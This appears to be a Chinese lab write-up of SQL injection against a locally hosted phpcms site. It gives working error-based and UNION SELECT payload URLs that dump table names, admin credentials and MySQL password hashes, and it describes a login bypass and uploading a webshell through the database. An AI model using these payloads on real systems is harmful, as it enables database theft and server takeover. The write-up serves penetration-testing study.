---
title: phpcms框架SQL注入
date: 2018-10-29 15:28:52
tags: [实验]
categories: sql注入
---
# phpcms框架SQL注入

## 注入页面

![001](/img/sql/phpcms/001.png)

## 注入过程

随便点击一个页面进行注入

发现返回报错信息

![002](/img/sql/phpcms/002.png)



### 判断注入类型

通过判断为数字型

![003](/img/sql/phpcms/003.png)



### 获取用户和当前数据库名

`http://192.168.0.109:8083/show.php?id=33%20and%20extractvalue(null,concat(0x7e,concat(user(),0x7e,database()),0x7e))%23`

![004](/img/sql/phpcms/004.png)

### 获取表名

`http://192.168.0.109:8083/show.php?id=33%20and%20extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema='cms' limit 1,1),0x7e))%23`

发现表名太多了,还是直接爆出比较犀利

![005](/img/sql/phpcms/005.png)



`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='cms'),4,5,6,7,8,9,10,11,12,13,14,15%23`

![006](/img/sql/phpcms/006.png)

直接爆出会遇上编码问题，需要concert()函数转码。

`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(convert(table_name using latin1)) from information_schema.tables where table_schema='cms'),4,5,6,7,8,9,10,11,12,13,14,15%23`

![007](/img/sql/phpcms/007.png)

### 获取列名

`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(convert(column_name using latin1)) from information_schema.columns where table_schema='cms' and table_name='cms_users'),4,5,6,7,8,9,10,11,12,13,14,15%23`

![009](/img/sql/phpcms/009.png)



### 获取账户

`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(userid,0x7e,username,0x7e,password) from cms.cms_users),4,5,6,7,8,9,10,11,12,13,14,15%23`

![010](/img/sql/phpcms/010.png)

解密后密码为：

![011](/img/sql/phpcms/011.png)

同理可获取mysql数据库的账户密码

`http://192.168.0.109:8083/show.php?id=33 and 1=2 union select 1,2,(select group_concat(User,0x7e,Password) from mysql.user),4,5,6,7,8,9,10,11,12,13,14,15%23`

![012](/img/sql/phpcms/012.png)

![013](/img/sql/phpcms/013.png)

## 登录后台

### 登录界面存在SQL注入和万能密码

登录界面存在万能密码，闭合方式为`'""'`（5.4版本）

![014](/img/sql/phpcms/014.png)

同样存在SQL注入

![017](/img/sql/phpcms/016.png)

![015](/img/sql/phpcms/015.png)



### 上传文件

直接上传会出现文件限制

![017](/img/sql/phpcms/017.png)

尝试多种方法后发现上传这条路不通。



### 数据库上传

![018](/img/sql/phpcms/018.png)



![020](/img/sql/phpcms/020.png)

上传一个phpinfo试试,成功访问

![021](/img/sql/phpcms/021.png)

同理再传个一句话木马,用菜刀连接

![022](/img/sql/phpcms/022.png)